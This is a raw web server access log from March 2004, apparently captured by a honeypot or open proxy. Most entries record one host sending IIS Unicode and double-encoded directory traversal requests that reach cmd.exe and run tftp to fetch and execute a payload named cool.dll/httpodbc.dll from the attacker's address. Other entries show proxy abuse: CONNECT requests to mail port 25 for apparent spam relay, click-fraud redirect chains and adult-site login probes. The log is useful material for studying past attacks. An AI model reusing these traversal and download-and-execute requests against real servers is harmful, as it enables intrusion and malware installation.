IP	Ident	Userid	Timestamp	Timezone	HTTP_Request	HTTP_Status	HTTP_Duration	HTTP_Referer	Browser_Type
68.48.142.117	-	-	[09/Mar/2004:22:41:37	-0500]	GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:41:37	-0500]	GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:41:38	-0500]	GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:41:41	-0500]	GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:41:41	-0500]	GET /scripts/..%c1%1c../httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:41:41	-0500]	GET /scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir HTTP/1.0	404	305	-	-
68.48.142.117	-	-	[09/Mar/2004:22:41:41	-0500]	GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:41:41	-0500]	GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:41:41	-0500]	GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:41:41	-0500]	GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:41:41	-0500]	GET /scripts/..%c0%af../httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:41:42	-0500]	GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:41:42	-0500]	GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:41:42	-0500]	GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:41:42	-0500]	GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:41:42	-0500]	GET /scripts/..%c1%9c../httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:41:42	-0500]	GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0	400	289	-	-
68.48.142.117	-	-	[09/Mar/2004:22:41:42	-0500]	GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0	400	289	-	-
68.48.142.117	-	-	[09/Mar/2004:22:42:19	-0500]	GET /d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:42:19	-0500]	GET /d/httpodbc.dll HTTP/1.0	404	282	-	-
68.48.142.117	-	-	[09/Mar/2004:22:42:35	-0500]	GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:43:12	-0500]	GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:43:25	-0500]	GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0	200	566	-	-
62.58.50.81	-	-	[09/Mar/2004:22:43:26	-0500]	CONNECT 205.231.29.241:25 HTTP/1.0	200	-	-	-
62.58.50.81	-	-	[09/Mar/2004:22:43:58	-0500]	POST http://205.231.29.241:25/ HTTP/1.0	200	85	-	-
68.48.142.117	-	-	[09/Mar/2004:22:44:03	-0500]	GET /scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:44:17	-0500]	GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:44:53	-0500]	GET /scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0	200	566	-	-
192.117.242.67	-	-	[09/Mar/2004:22:45:06	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
192.117.242.67	-	-	[09/Mar/2004:22:45:06	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
68.48.142.117	-	-	[09/Mar/2004:22:45:08	-0500]	GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:45:43	-0500]	GET /scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0	200	566	-	-
203.121.182.189	-	-	[09/Mar/2004:22:45:56	-0500]	CONNECT 211.22.130.68:25 HTTP/1.0	200	-	-	-
68.48.142.117	-	-	[09/Mar/2004:22:45:58	-0500]	GET /scripts/..%25%35%63../httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:46:36	-0500]	GET /scripts/..%255c../httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:46:48	-0500]	GET /scripts/..%252f../winnt/system32/cmd.exe?/c+dir HTTP/1.0	200	566	-	-
61.53.76.40	-	-	[09/Mar/2004:22:47:17	-0500]	POST http://69.59.175.60/found-best.com/search.php HTTP/1.0	200	21081	http://www.sanlala.com/index.html	Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt)
68.48.142.117	-	-	[09/Mar/2004:22:47:26	-0500]	GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0	200	566	-	-
220.175.18.42	-	-	[09/Mar/2004:22:47:35	-0500]	GET http://searchlikecrazy.com/cgi-bin/sf.cgi?t=es&keys=zvzssxzazhzasohyzohxhiaxayziznzdsazmayaoaphsshahhhzisksisisfhmsvanaiasassdsnhisnanasahafhdhvzpzyzihoaxamhczpzyzvzazpzxhczzsasfzshizhszamsyhfspszsoaysssszvazfvfmhnhkzczizczvzdadadzn&kw=web+design HTTP/1.0	302	333	http://www.searchlikecrazy.com/cgi-bin/smartsearch.cgi?keywords=Web+Design%20&username=arongyi	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; MyIE2)
68.48.142.117	-	-	[09/Mar/2004:22:47:38	-0500]	GET /scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0	200	566	-	-
220.175.18.42	-	-	[09/Mar/2004:22:47:40	-0500]	GET http://65.17.208.131/search/search/redirect.php?s=5460953&r=1&l=1 HTTP/1.0	302	0	http://www.searchlikecrazy.com/cgi-bin/smartsearch.cgi?keywords=Web+Design%20&username=arongyi	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; MyIE2)
220.175.18.42	-	-	[09/Mar/2004:22:47:41	-0500]	GET http://www.kanoodle.com/clickthrough.cool?position=7001&tid=bhngbnnobonpbgnkbknpzqrdxbxoyx&bid=0.09&eid=1&id=77810869&query=web%20design&clickid=23442688&UNQ=00107889044985920592&subid=10470 HTTP/1.0	301	344	http://www.searchlikecrazy.com/cgi-bin/smartsearch.cgi?keywords=Web+Design%20&username=arongyi	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; MyIE2)
220.175.18.42	-	-	[09/Mar/2004:22:47:43	-0500]	GET http://order.1and1.com/xml/order/Hosting?ac=OM.US.US431K02123T1785a HTTP/1.0	302	647	http://www.searchlikecrazy.com/cgi-bin/smartsearch.cgi?keywords=Web+Design%20&username=arongyi	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; MyIE2)
192.117.242.67	-	-	[09/Mar/2004:22:47:49	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
220.175.18.42	-	-	[09/Mar/2004:22:47:49	-0500]	GET http://order.1and1.com/xml/order/Hosting;jsessionid=D05DD9B48032ADC5828D6F02C4D2935D.TC62a?ac=OM.US.US431K02123T1785a HTTP/1.0	200	19093	http://www.searchlikecrazy.com/cgi-bin/smartsearch.cgi?keywords=Web+Design%20&username=arongyi	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; MyIE2)
203.121.182.139	-	-	[09/Mar/2004:22:47:56	-0500]	CONNECT 212.69.119.246:25 HTTP/1.0	200	-	-	-
68.48.142.117	-	-	[09/Mar/2004:22:48:16	-0500]	GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:48:28	-0500]	GET /scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0	200	566	-	-
203.121.182.189	-	-	[09/Mar/2004:22:48:40	-0500]	CONNECT 61.172.201.173:25 HTTP/1.0	200	-	-	-
62.195.43.15	-	-	[09/Mar/2004:22:49:05	-0500]	GET http://62.195.43.15/members/sex/fuck/id000057id/lund2676lundxxx.html HTTP/1.0	401	0	-	-
68.48.142.117	-	-	[09/Mar/2004:22:49:09	-0500]	GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0	200	566	-	-
203.121.182.141	-	-	[09/Mar/2004:22:49:12	-0500]	CONNECT 207.137.186.92:25 HTTP/1.0	500	434	-	-
68.48.142.117	-	-	[09/Mar/2004:22:49:19	-0500]	GET /scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:49:59	-0500]	GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0	200	566	-	-
192.117.242.67	-	-	[09/Mar/2004:22:50:05	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
218.68.219.92	-	-	[09/Mar/2004:22:50:06	-0500]	GET http://Pay-Per-Click.Ws/s.php?username=discovery&keywords=Lodging HTTP/1.0	200	38043	http://Pay-Per-Click.Ws/s.php?username=discovery	Mozilla/4.0(compatible; MSIE 5.5; Windows 98)
68.48.142.117	-	-	[09/Mar/2004:22:50:09	-0500]	GET /scripts/..%252f../httpodbc.dll HTTP/1.0	200	566	-	-
218.68.219.92	-	-	[09/Mar/2004:22:50:27	-0500]	GET http://www.pay-per-click.ws/other.php?k=hphahzhchszmhmhnhphazfzssifaandfaafosvdisifzfzfcdfdvfpfnfydhdmfcaxsysvdihhdydffmspdpafazdcfisoffdyskaofffifnfsfkfpskfkfpdzfidkavfyzcdhsnamfodifadndfdhfxspfvdofizodpfifysdaidyfzafdffysvdczpsyfidmasdcsvsidyzhavddskhzfkhsdddifvdcashzfmfifndkfvzydcfyfahfspdyfidpdkhcsnaxzkfxanfmazhzfdspdhdifhscdpaksvhxdkzhfodmzffifmsidpsidfazsfakfkspskdidfspdcsvfyandkfxscahdkfdfpsvdfandfasfodxacspdzdfavaadffkfmdvskzzfkfpdfadfpdfdkdyanfydpdcacfpfidffsfidkaisnhzzkdoffakfzfiffhhdcfafhaafzdxfisodzsifoszazshfphzfidffadcdphzfksssffsscdzashcfsfhdpsoapasfofyfashspdyfifzscdcfdshdzanfizydphxfpfmdkfzfyaazyfkdifmdcsosczpscfidisyfizhfyzvfzfosnhdfnsyanayazfidiszdpdkanfhdpfkfdspddazfkshzchzfksdfnfcscaodcfkazdsdzsifsszdphhdihaddfxsxznfzdxaxfififcffdpdpfisnsofnfxfkdnzkdsfxdndfzhscsvdcdsaxfsasdoscdszfaifmdzdffafyapzkfkfkhsdxfsapdyfzdhfdanzpdfdfshzksvfpsnzmzxsxsmzffffpsdzpfhscsvzfsnfpsnzdsdfpacdfdaaxsddzdffcapzcdsazdsdhdashfcaphsfhsxakfphiasaafxfnfydhdmfczmdfaasddzfnaoapdzhpfdfnfydhdmfcaozffksnssdkzxsxapscfpfndnfkszfidvzdfnsvshfvdasxahdcakdysodpzcavzyddaddisvfafsfhsvzffpfnfydhdmfcdfdvfpfnfydhsahpfvdvfpfnfkdhdmfcdffosvdisifaandfaafodmfhhisdazakshznaisxaxsfhpsysksksosdadaohpafaksxzpsasdsfsdsmskayshazsnsvaszcszsxafayaahzhphfayassdad&u=rpilot&a=discovery&sid=base&keywords=lodging&gen=s&gto=zpzahshyhszfzohyzizc HTTP/1.0	302	0	http://Pay-Per-Click.Ws/s.php?username=discovery&keywords=Lodging	Mozilla/4.0(compatible; MSIE 5.5; Windows 98)
218.68.219.92	-	-	[09/Mar/2004:22:50:32	-0500]	GET http://click.revenuepilot.com/servlet/link?link=P_MzMzMzMzMAAAABAAAH2gAAAAAAAAAAAA5hZHMuMjQ3d3NyLmNvbQEqbY4RQdHLAAdsb2RnaW5nAAAAAT-UeuFHrhR7AAAAAPsy4_rsP4zMzQADeG1sATBodHRwOi8vYy5haC1oYS5jb20vYz9lMT1lRDFPeHY1UW9sTGVHZk5YaUxNdGNha0VLNG9QSEFyaUZSWFJZdFF4bEU0M1ZkUlBDeWNnaFFoU01lSnUxRWZLcXNrMUppcmF2aVF5T0JaMUd6akZWMW8zTDRWY3Z3QzBqREdKQWdqTXMyekNQS2tUaHlnU0ZWVTJ5YnpkRlByWFFzZGZ4QUFoWU55akVCUTJXcEZFcWRFYjRIS1hKZWRzdTBxcFMyMzVuYTVvaERlVzNiMVhxUmhuMlNzZU5TR0R6bmZmZVAxR0pJcE5ia2VSQWd3TXN3NXFZZ0tWNVU1U0lBd0QzbEtTQm1JbXRaYWtoVUZ1QUExNDRQVVImaD1FdXJHYWlISHFZQllPWkJJeiZiPTQ4MzkxAAAAAAAAAD_zMzMzMzMz HTTP/1.0	302	342	http://Pay-Per-Click.Ws/s.php?username=discovery&keywords=Lodging	Mozilla/4.0(compatible; MSIE 5.5; Windows 98)
218.68.219.92	-	-	[09/Mar/2004:22:50:35	-0500]	GET http://c.ah-ha.com/c?e1=eD1Oxv5QolLeGfNXiLMtcakEK4oPHAriFRXRYtQxlE43VdRPCycghQhSMeJu1EfKqsk1JiraviQyOBZ1GzjFV1o3L4VcvwC0jDGJAgjMs2zCPKkThygSFVU2ybzdFPrXQsdfxAAhYNyjEBQ2WpFEqdEb4HKXJedsu0qpS235na5ohDeW3b1XqRhn2SseNSGDznffeP1GJIpNbkeRAgwMsw5qYgKV5U5SIAwD3lKSBmImtZakhUFuAA144PUR&h=EurGaiHHqYBYOZBIz&b=48391 HTTP/1.0	302	0	http://Pay-Per-Click.Ws/s.php?username=discovery&keywords=Lodging	Mozilla/4.0(compatible; MSIE 5.5; Windows 98)
218.68.219.92	-	-	[09/Mar/2004:22:50:40	-0500]	GET http://c.ah-ha.com/c/2?e1=eD1Oxv5QolLeGfNXiLMtcakEK4oPHAriFRXRYtQxlE43VdRPCycghQhSMeJu1EfKqsk1JiraviQyOBZ1GzjFV1o3L4VcvwC0jDGJAgjMs2zCPKkThygSFVU2ybzdFPrXQsdfxAAhYNyjEBQ2WpFEqdEb4HKXJedsu0qpS235na5ohDeW3b1XqRhn2SseNSGDznffeP1GJIpNbkeRAgwMsw5qYgKV5U5SIAwD3lKSBmImtZakhUFuAA144PUR&h=EurGaiHHqYBYOZBIz&b=48391 HTTP/1.0	302	0	http://Pay-Per-Click.Ws/s.php?username=discovery&keywords=Lodging	Mozilla/4.0(compatible; MSIE 5.5; Windows 98)
68.48.142.117	-	-	[09/Mar/2004:22:50:49	-0500]	GET /_vti_bin/..%255c../..%255c../..%255c../httpodbc.dll HTTP/1.0	200	566	-	-
218.68.219.92	-	-	[09/Mar/2004:22:50:49	-0500]	GET http://ads.247wsr.com/9655-17962-30/ HTTP/1.0	302	1035	http://Pay-Per-Click.Ws/s.php?username=discovery&keywords=Lodging	Mozilla/4.0(compatible; MSIE 5.5; Windows 98)
24.235.131.196	-	-	[09/Mar/2004:22:51:09	-0500]	GET http://24.235.131.196:80/proxyjudge.html HTTP/1.0	200	219	-	Mozilla/3.0 (compatible)
24.235.131.196	-	-	[09/Mar/2004:22:51:10	-0500]	GET http://members.bangbus.com HTTP/1.0	401	3784	-	Mozilla/3.0 (compatible)
218.68.219.92	-	-	[09/Mar/2004:22:51:13	-0500]	GET http://www.searchaddicts.com/cgi-bin/sf.cgi?t=rp&keys=hnfzaafpaafpzpxdamfzfddddfdkcvcxdndsdfdkdfznhozcahdydxdismadhsxdaofnsmdaaxsnzpcnzhscfofpdzdhxzcsaizmscdozkfdhochfxdyzidzaxdzxhcifzfosmdafodaaxcoapfifodfzvsnxcxdzxfzsmdaznfpaxcofxsydmdffkdhxhcizxscfodhfkdhhyxdaoskfodhfkdhhyxdaodsaadxdyzvhyxdaofnsmdaaxsnzpcnzhscfofpdyzvaxckapfifodfzvsnxcxdaosksmdaznfpaxcofxsydmdffkdhxhcizxscfodhfkdhhyxdaoskfodhfkdhhyxdaodsaadzfodacyczapsxscsssvshhohvsadddxsfspsacocpaddyscakscacahchafzyfodhfmzvcszxaxdyscdoazfcazxsazdyscsssvdvahhvayazdcdismzvxdzcaasczkdosmzvcazcaydyscfvavdacozxzxfodxfvzisvxdczaksxscdoazssazhnzhzxasfvzpdkxfhnzcsmfnamdfapcozczfdydfdkdoaoxoxndndaasffshfvzpszdndsdfdkddacxfxpaksidzzzzpdhafcpfkdsdfdkdfznhozcahdydxdismdocvcxdadnsisvfdaahdxpzxfidnayahdahoxsaxzmdcakapfxcozcsdsyfndaaadvahchsdfodddkdfdkcvcxdndsdfdkdfdkhdcdszdsdfdkdddkcvcxdnfzaafpaafpzpxdamfzfdddzasnzchysyzaszaaspsvsnzkszsxahahskacsnhdazskhfaxaksvhazpszacaosfahsfzfsxskskspsvsihysnadahavamshzasvzfzahsafavsfahafhxzysssyzafafphcasavzchszizososczn&kw=casino HTTP/1.1	302	722	http://www.searchaddicts.com/cgi-bin/smartsearch.cgi	Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt)
218.68.219.92	-	-	[09/Mar/2004:22:51:24	-0500]	GET http://click.revenuepilot.com/servlet/link?link=P_MzMzMzMzMAAAABAAAeWgAAAAAAAAAAABFhY2VzNGdhbWJsaW5nLmNvbQE1Fgn_lcSTAAZjYXNpbm8AAAAKP5R64UeuFHsBAAAA-zLlEyBADMzNAAN4bWwAxGh0dHA6Ly93d3cuZmluZGl0LXF1aWNrLmNvbS9jZ2ktbG9jYWwvc2VhcmNoL3IuZmNnaT9JRD1qY2smamNrPWdieXZjcmhhcmlyZUNDQzAxMkRERDcxMkRERDk1REREOTdDQ0M4NjcxMDk5ODEyT09PMDk3NzkxNjIxMk9PTzAxMkRERDcxMkRERDk1REREOTdDQ0M4NjM1MDk5ODEyQ0NDNjFEREQxQ0NDYmF2Zm5wVFRUMDk3NzkxNjIxMjpjYXNpbm8AAAAAAAAAP_MzMzMzMzM. HTTP/1.1	302	234	http://www.searchaddicts.com/cgi-bin/sf.cgi?t=rp&keys=hnfzaafpaafpzpxdamfzfddddfdkcvcxdndsdfdkdfznhozcahdydxdismadhsxdaofnsmdaaxsnzpcnzhscfofpdzdhxzcsaizmscdozkfdhochfxdyzidzaxdzxhcifzfosmdafodaaxcoapfifodfzvsnxcxdzxfzsmdaznfpaxcofxsydmdffkdhxhcizxscfodhfkdhhyxdaoskfodhfkdhhyxdaodsaadxdyzvhyxdaofnsmdaaxsnzpcnzhscfofpdyzvaxckapfifodfzvsnxcxdaosksmdaznfpaxcofxsydmdffkdhxhcizxscfodhfkdhhyxdaoskfodhfkdhhyxdaodsaadzfodacyczapsxscsssvshhohvsadddxsfspsacocpaddyscakscacahchafzyfodhfmzvcszxaxdyscdoazfcazxsazdyscsssvdvahhvayazdcdismzvxdzcaasczkdosmzvcazcaydyscfvavdacozxzxfodxfvzisvxdczaksxscdoazssazhnzhzxasfvzpdkxfhnzcsmfnamdfapcozczfdydfdkdoaoxoxndndaasffshfvzpszdndsdfdkddacxfxpaksidzzzzpdhafcpfkdsdfdkdfznhozcahdydxdismdocvcxdadnsisvfdaahdxpzxfidnayahdahoxsaxzmdcakapfxcozcsdsyfndaaadvahchsdfodddkdfdkcvcxdndsdfdkdfdkhdcdszdsdfdkdddkcvcxdnfzaafpaafpzpxdamfzfdddzasnzchysyzaszaaspsvsnzkszsxahahskacsnhdazskhfaxaksvhazpszacaosfahsfzfsxskskspsvsihysnadahavamshzasvzfzahsafavsfahafhxzysssyzafafphcasavzchszizososczn&kw=casino	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
68.48.142.117	-	-	[09/Mar/2004:22:51:39	-0500]	GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:52:32	-0500]	GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0	200	566	-	-
192.117.242.67	-	-	[09/Mar/2004:22:52:52	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
68.48.142.117	-	-	[09/Mar/2004:22:53:23	-0500]	GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0	200	566	-	-
203.61.199.15	-	-	[09/Mar/2004:22:53:24	-0500]	HEAD http://www.bestobeast.com/members/ HTTP/1.0	200	0	-	Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)
203.61.199.15	-	-	[09/Mar/2004:22:53:24	-0500]	HEAD http://www.bestobeast.com/members/ HTTP/1.0	200	0	-	Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)
203.61.199.15	-	-	[09/Mar/2004:22:53:24	-0500]	HEAD http://www.bestobeast.com/members/ HTTP/1.0	200	0	-	Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)
203.61.199.15	-	-	[09/Mar/2004:22:53:25	-0500]	HEAD http://www.bestobeast.com/members/ HTTP/1.0	200	0	-	Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)
203.61.199.15	-	-	[09/Mar/2004:22:53:25	-0500]	HEAD http://www.bestobeast.com/members/ HTTP/1.0	200	0	-	Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)
203.61.199.15	-	-	[09/Mar/2004:22:53:25	-0500]	HEAD http://www.bestobeast.com/members/ HTTP/1.0	200	0	-	Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)
203.61.199.15	-	-	[09/Mar/2004:22:53:25	-0500]	HEAD http://www.bestobeast.com/members/ HTTP/1.0	200	0	-	Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)
203.61.199.15	-	-	[09/Mar/2004:22:53:25	-0500]	HEAD http://www.bestobeast.com/members/ HTTP/1.0	200	0	-	Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)
68.48.142.117	-	-	[09/Mar/2004:22:54:13	-0500]	GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:55:03	-0500]	GET /_mem_bin/..%255c../..%255c../..%255c../httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:55:04	-0500]	GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:55:04	-0500]	GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:55:04	-0500]	GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:55:04	-0500]	GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:55:04	-0500]	GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:55:04	-0500]	GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:55:04	-0500]	GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:55:04	-0500]	GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:22:55:05	-0500]	GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0	200	566	-	-
